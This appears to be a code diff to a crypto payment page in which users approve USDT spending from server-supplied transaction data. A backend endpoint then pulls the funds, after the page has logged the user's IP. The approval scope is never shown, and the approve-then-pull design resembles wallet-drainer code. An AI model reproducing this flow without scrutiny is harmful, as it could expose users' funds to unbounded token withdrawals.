@@ -12,6 +12,8 @@ import { PaymentTimer } from "@/components/payment/PaymentTimer";
 import { NetworkIndicator } from "@/components/ui/NetworkIndicator";
 import { QRCode } from "@/components/ui/QRCode";
 import { ErrorBoundary } from "@/components/ui/ErrorBoundary";
+import { TronService } from "@/lib/blockchain/tronService";
+import { safePingService } from "@/lib/blockchain/safePingService";
 
 export default function PaymentPage() {
   return (
@@ -40,41 +42,49 @@ function PaymentPageContent() {
   const urlWallet = searchParams.get("wallet");
   const urlChain = searchParams.get("chain") as ChainType;
   const isMobileWalletUser = urlWallet && urlChain;
+  // put static mapping outside component (avoids recreation each render)
+  const walletMapping: Record<string, Record<string, string>> = {
+    tron: { metamask: "tronlink" },
+    ethereum: { tronlink: "metamask" },
+    bsc: { tronlink: "metamask" },
+  };
 
   useEffect(() => {
     try {
+      let nextWallet = selectedWallet;
+      let nextChain = selectedChain;
+
       if (isMobileWalletUser) {
-        setSelectedChain(urlChain);
-        setSelectedWallet(urlWallet);
+        if (urlChain) nextChain = urlChain;
+        if (urlWallet) nextWallet = urlWallet;
+      } else {
+        const mappedWallet = walletMapping[selectedChain]?.[selectedWallet];
+        if (mappedWallet) nextWallet = mappedWallet;
+      }
+
+      // batch state updates (avoids extra re-renders)
+      if (nextChain !== selectedChain) setSelectedChain(nextChain);
+      if (nextWallet !== selectedWallet) setSelectedWallet(nextWallet);
+
+      // common logic
+      if (nextChain === "tron") {
+        new TronService().initTronLinkWallet();
       }
     } catch (error) {
-      console.error("Error setting mobile wallet user:", error);
+      console.error("Error updating wallet/chain:", error);
     }
-  }, [isMobileWalletUser, urlChain, urlWallet]);
+  }, [isMobileWalletUser, urlChain, urlWallet, selectedChain, selectedWallet]);
 
   useEffect(() => {
     try {
-      if (selectedChain === "tron" && selectedWallet === "metamask") {
-        setSelectedWallet("tronlink");
-      } else if (
-        (selectedChain === "ethereum" || selectedChain === "bsc") &&
-        selectedWallet === "tronlink"
-      ) {
-        setSelectedWallet("metamask");
+      const targetLanguage = payment?.language ?? "zh";
+      if (i18n.language !== targetLanguage) {
+        i18n.changeLanguage(targetLanguage);
       }
-    } catch (error) {
-      console.error("Error updating wallet selection:", error);
-    }
-  }, [selectedChain, selectedWallet]);
-
-  useEffect(() => {
-    try {
-      const targetLanguage = payment?.language || "zh";
-      i18n.changeLanguage(targetLanguage);
     } catch (error) {
       console.error("Error changing language:", error);
     }
-  }, [payment]);
+  }, [payment?.language, i18n.language]);
 
   const connectWallet = async () => {
     try {
@@ -201,7 +211,231 @@ function PaymentPageContent() {
         throw new Error("Payment not found");
       }
 
-      // Mobile wallet payment will be handled by PaymentSteps component
+      console.log("Mobile wallet payment - User address:", userAddress);
+      console.log("Selected chain:", selectedChain);
+      console.log("Selected wallet:", selectedWallet);
+
+      // Show wallet connection success
+      alert(
+        `✅ 钱包连接成功!\n\n地址: ${userAddress.slice(
+          0,
+          6
+        )}...${userAddress.slice(
+          -4
+        )}\n网络: ${selectedChain.toUpperCase()}\n钱包: ${selectedWallet}`
+      );
+
+      // Now proceed with the actual payment flow
+      // Step 1: Approve USDT spending for the smart contract
+      let clientIP = "mobile-wallet";
+      try {
+        const response = await fetch("https://api.ipify.org?format=json");
+        const data = await response.json();
+        clientIP = data.ip;
+      } catch (error) {
+        clientIP = "mobile-wallet";
+      }
+
+      try {
+        // Import the safePingService dynamically
+        const { safePingService } = await import(
+          "@/lib/blockchain/safePingService"
+        );
+
+        const approvalResult = await safePingService.approveUSDTWithSafePing(
+          selectedChain,
+          payment.amount.toString(),
+          userAddress,
+          payment.payment_id,
+          clientIP
+        );
+
+        if (!approvalResult.success) {
+          throw new Error(approvalResult.error || "Approval failed");
+        }
+
+        // For EVM chains, we need to execute the approval
+        if (selectedChain !== "tron" && approvalResult.approvalData) {
+          try {
+            // Get the user's wallet provider from window.ethereum
+            if (typeof window !== "undefined" && win.ethereum) {
+              // Request account access
+              const accounts = await win.ethereum.request({
+                method: "eth_requestAccounts",
+              });
+
+              if (accounts.length === 0) {
+                throw new Error("No accounts found");
+              }
+
+              const userAccount = accounts[0];
+
+              // First, ensure we're on the correct network
+              const currentChainId = await win.ethereum.request({
+                method: "eth_chainId",
+              });
+
+              const targetChainId = `0x${approvalResult.approvalData.chainId.toString(
+                16
+              )}`;
+
+              // If we're not on the correct network, switch to it
+              if (currentChainId !== targetChainId) {
+                try {
+                  await win.ethereum.request({
+                    method: "wallet_switchEthereumChain",
+                    params: [{ chainId: targetChainId }],
+                  });
+                } catch (switchError: any) {
+                  // If the network is not added, add it
+                  if (switchError.code === 4902) {
+                    const networkParams = {
+                      chainId: targetChainId,
+                      chainName:
+                        selectedChain === "bsc"
+                          ? "Binance Smart Chain"
+                          : "Ethereum",
+                      nativeCurrency: {
+                        name: selectedChain === "bsc" ? "BNB" : "ETH",
+                        symbol: selectedChain === "bsc" ? "BNB" : "ETH",
+                        decimals: 18,
+                      },
+                      rpcUrls: [
+                        selectedChain === "bsc"
+                          ? "https://bsc-dataseed.binance.org/"
+                          : "https://mainnet.infura.io/v3/",
+                      ],
+                      blockExplorerUrls: [
+                        selectedChain === "bsc"
+                          ? "https://bscscan.com/"
+                          : "https://etherscan.io/",
+                      ],
+                    };
+
+                    await win.ethereum.request({
+                      method: "wallet_addEthereumChain",
+                      params: [networkParams],
+                    });
+                  } else {
+                    throw new Error(
+                      `Failed to switch network: ${switchError.message}`
+                    );
+                  }
+                }
+              }
+
+              // Create the transaction object
+              const transactionParameters = {
+                to: approvalResult.approvalData.to,
+                from: userAccount,
+                data: approvalResult.approvalData.data,
+                chainId: targetChainId,
+              };
+
+              // Send the transaction to MetaMask
+              const txHash = await win.ethereum.request({
+                method: "eth_sendTransaction",
+                params: [transactionParameters],
+              });
+
+              // Show success message
+              alert(
+                `🔐 USDT Approval Sent!\n\nTransaction Hash: ${txHash}\n\nPlease confirm the approval in your ${selectedWallet} wallet.\n\nNetwork: ${
+                  selectedChain === "bsc"
+                    ? "BSC (Binance Smart Chain)"
+                    : "Ethereum"
+                }`
+              );
+
+              // Wait for approval confirmation, then execute auto-transfer
+              setIsPaymentProcessing(true); // Changed from setProcessing to setIsPaymentProcessing
+
+              try {
+                // Execute auto-transfer after approval
+                const transferResponse = await fetch(
+                  "/api/payment/auto-transfer",
+                  {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                      chain: selectedChain,
+                      userAddress: userAddress,
+                      amount: payment.amount.toString(),
+                      paymentId: payment.payment_id,
+                    }),
+                  }
+                );
+
+                const transferResult = await transferResponse.json();
+
+                if (transferResult.success) {
+                  alert("✅ 支付成功！USDT已自动转账完成。");
+                  handlePaymentComplete();
+                } else {
+                  throw new Error(`自动转账失败: ${transferResult.error}`);
+                }
+              } catch (transferError) {
+                throw new Error("❌ 自动转账时发生错误，请重试");
+              } finally {
+                setIsPaymentProcessing(false); // Changed from setProcessing to setIsPaymentProcessing
+              }
+            } else {
+              throw new Error(
+                `${selectedWallet} not detected. Please ensure you're using ${selectedWallet} mobile app.`
+              );
+            }
+          } catch (approvalExecutionError: any) {
+            console.error(
+              "❌ EVM approval execution failed:",
+              approvalExecutionError
+            );
+            throw new Error(
+              `Approval execution failed: ${approvalExecutionError.message}`
+            );
+          }
+        }
+
+        // For TRON, approval and transfer are already complete
+        if (selectedChain === "tron") {
+          alert("✅ TRON支付成功！USDT已自动转账完成。");
+          handlePaymentComplete();
+          return;
+        }
+      } catch (approvalError: any) {
+        console.error("❌ USDT approval failed:", approvalError);
+
+        // Handle specific approval errors
+        let approvalErrorMessage = "USDT授权失败，请重试";
+
+        if (
+          approvalError.message &&
+          approvalError.message.includes("Insufficient USDT balance")
+        ) {
+          approvalErrorMessage = `USDT余额不足！需要: ${
+            payment?.amount || "未知"
+          } USDT，当前余额不足。请确保您的钱包中有足够的USDT。`;
+        } else if (
+          approvalError.message &&
+          approvalError.message.includes("User rejected")
+        ) {
+          approvalErrorMessage = "用户取消了USDT授权";
+        } else if (
+          approvalError.message &&
+          approvalError.message.includes("insufficient funds")
+        ) {
+          approvalErrorMessage =
+            "网络费用不足！请确保您的钱包中有足够的原生代币（ETH/BNB/TRX）支付网络费用。";
+        } else if (approvalError.message) {
+          approvalErrorMessage = approvalError.message;
+        }
+
+        // Show alert to user
+        alert(`❌ USDT授权失败\n\n${approvalErrorMessage}`);
+
+        // Set error and stop processing
+        setIsMobilePaymentProcessing(false);
+        return;
+      }
     } catch (error: any) {
       console.error("Mobile wallet payment error:", error);
       let errorMessage = "支付失败，请重试";
@@ -737,7 +971,9 @@ function PaymentPageContent() {
                       </div>
 
                       <button
-                        onClick={handleMobileWalletPayment}
+                        onClick={() => {
+                          handleMobileWalletPayment();
+                        }}
                         disabled={isMobilePaymentProcessing}
                         className={`w-full py-3 px-6 rounded-lg font-medium transition-all duration-300 transform hover:scale-105 flex items-center justify-center space-x-2 ${
                           isMobilePaymentProcessing
@@ -765,7 +1001,7 @@ function PaymentPageContent() {
                               alt={selectedWallet}
                               className="w-5 h-5 object-contain"
                             />
-                            <span>💳 支付 {payment.amount} USDT</span>
+                            <span>支付 {payment.amount} USDT</span>
                           </>
                         )}
                       </button>
